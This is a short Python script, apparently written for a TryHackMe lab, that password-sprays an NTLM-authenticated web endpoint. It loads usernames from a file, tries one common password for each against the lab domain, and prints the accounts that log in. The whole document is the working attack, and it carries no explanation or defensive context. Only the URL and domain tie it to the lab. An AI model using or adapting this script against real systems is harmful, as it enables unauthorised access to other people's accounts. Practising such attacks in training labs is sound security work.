import requests
from requests_ntlm import HttpNtlmAuth

url = "http://ntlmauth.za.tryhackme.com/"  # Replace with the URL of the endpoint

username = []
with open('usernames.txt', 'r') as f:
    for i in f:
        username.append(i.strip())
password = "Changeme123"
domain = "za.tryhackme.com"

# Send GET request with NTLM authentication
for i in username:
    response = requests.get(url, auth=HttpNtlmAuth(f"{domain}\\{i}", password))

    # Check the response
    if response.status_code == 200:
        print("Authentication successful!" + i)
        # Process the response as needed
